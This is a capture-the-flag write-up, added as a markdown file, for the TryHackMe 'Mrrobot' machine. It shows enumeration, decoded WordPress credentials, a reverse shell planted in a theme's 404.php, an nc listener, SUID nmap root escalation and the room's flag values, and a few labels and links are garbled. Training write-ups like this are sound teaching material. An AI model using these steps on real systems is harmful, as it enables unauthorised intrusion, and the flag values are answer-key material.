@@ -1,0 +1,185 @@
+---
+title: Mrrobot
+date: '2025-01-14'
+description: ''
+type: writeup
+platform: tryhackme
+tags:
+  - Easy
+  - LINUX
+  - TRY HACK ME
+cover: >-
+  /mc/uploads/2025/01/22100-3840x2160-desktop-4k-mr-robot-background-image-scaled.jpg
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+
+In this write-up, we will walk through the steps to hack the Mrrobot machine on Try Hack Me. Let's dive in!
+
+## Enumeration with Nmap
+
+```bash
+ nmap -sV  10.10.136.4 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-14 15:54 +01
+Nmap scan report for 10.10.136.4
+Host is up (0.11s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT    STATE  SERVICE  VERSION
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+443/tcp open   ssl/http Apache httpd
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 42.10 seconds
+```
+- **Port 80 (HTTP)** and **Port 443 (HTTPS)** are open, indicating a web server is  
+    running.
+- **Port 22 (SSH)** is closed, so we’ll focus on the web service for now.
+
+## directories FFUF
+
+Next, we’ll search for hidden directories and files on the web server using  
+**FFUF**, a fast web fuzzing tool.
+
+```bash
+$ ffuf -u http://10.10.136.4/FUZZ -w SecLists/Discovery/Web-Content/common.txt -mc 200,301
+
+0                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 396ms]
+Image                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 363ms]
+admin                   [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 318ms]
+audio                   [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 117ms]
+blog                    [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 70ms]
+css                     [Status: 301, Size: 231, Words: 14, Lines: 8, Duration: 57ms]
+favicon.ico             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 65ms]
+images                  [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 58ms]
+index.html              [Status: 200, Size: 1188, Words: 189, Lines: 31, Duration: 84ms]
+js                      [Status: 301, Size: 230, Words: 14, Lines: 8, Duration: 56ms]
+license                 [Status: 200, Size: 309, Words: 25, Lines: 157, Duration: 71ms]
+intro                   [Status: 200, Size: 516314, Words: 2076, Lines: 2028, Duration: 62ms]
+readme                  [Status: 200, Size: 64, Words: 14, Lines: 2, Duration: 65ms]
+robots                  [Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 58ms]
+robots.txt              [Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 59ms]
+sitemap.xml             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 58ms]
+sitemap                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 66ms]
+video                   [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 56ms]
+wp-admin                [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 64ms]
+wp-content              [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 68ms]
+wp-includes             [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 71ms]
+```
+**robots.txt** and **license** are particularly interesting. Let’s investigate them.  
+Visiting ** reveals the first flag:
+
+```bash
+curl http://10.10.136.4/key-1-of-3.txt                     
+073403c8a58a1f80d943455fb30724b9
+```
+The license file contains a Base64-encoded string:
+
+```bash
+curl http://10.10.136.4/license       
+
+what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?
+
+do you want a password or something?
+
+ZWxsaW90OkVSMjgtMDY1Mgo=
+```
+Decoding it reveals credentials:
+
+```bash
+$ echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' |base64 -d
+elliot:ER28-0652
+```
+## foothhold
+
+With the credentials, we log in to the WordPress admin panel at 
+
+### Exploiting WordPress:
+
+1. Navigate to Appearance > Theme Editor.
+2. Edit the 404.php template and insert a PHP reverse shell (you can generate  
+    one using tools like [PentestMonkey’s PHP Reverse Shell](https://www.revshells.com/)).
+3. Save the file and trigger the 404 page by visiting a non-existent URL, (e.g: .)
+
+Set up a listener on your machine:
+
+```bash
+nc -vlnp 9000
+```
+so after u will get the reverse shell
+
+```bash
+$ nc -vlnp 9000        
+listening on [any] 9000 ...
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+bash: cannot set terminal process group (2005): Inappropriate ioctl for device
+bash: no job control in this shell
+daemon@linux:/$ whoami
+whoami
+daemon
+```
+## Privilege Escalation
+
+Now, we’ll escalate our privileges to root.
+
+### Checking for SUID Binaries:
+
+SUID binaries allow users to execute files with the permissions of the file  
+owner. We search for SUID binaries using:
+
+```bash
+daemon@linux:/$ find / -perm -4000 2>/dev/null
+find / -perm -4000 2>/dev/null
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+```
+**Nmap** has the SUID bit set, which we can exploit.
+
+```bash
+daemon@linux:/$ /usr/local/bin/nmap --interactive
+nmap> !sh 
+whoami
+root
+```
+rootWith root access, we can now retrieve all the flags.
+
+Flag 2: Located in /home/robot
+
+```bash
+cat key-3-of-3.txt
+822c73956184f694993bede3eb39f959
+```
+Flag 3:
+
+```bash
+cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+```
+`                                       GG!🎉 `
+
+## Key Takeaways:
+
+**Enumeration is Key**: Tools like Nmap and FFUF help identify attack surfaces.
+
+**Credentials Matter**: Always check for hardcoded or encoded credentials in files like **robots.txt** or **license**.
+
+**Web Exploitation**: Misconfigurations in web applications (e.g., WordPress) can lead to initial access.
+
+**privilege Escalation**: SUID binaries are a common privilege escalation vector. Always check for them.
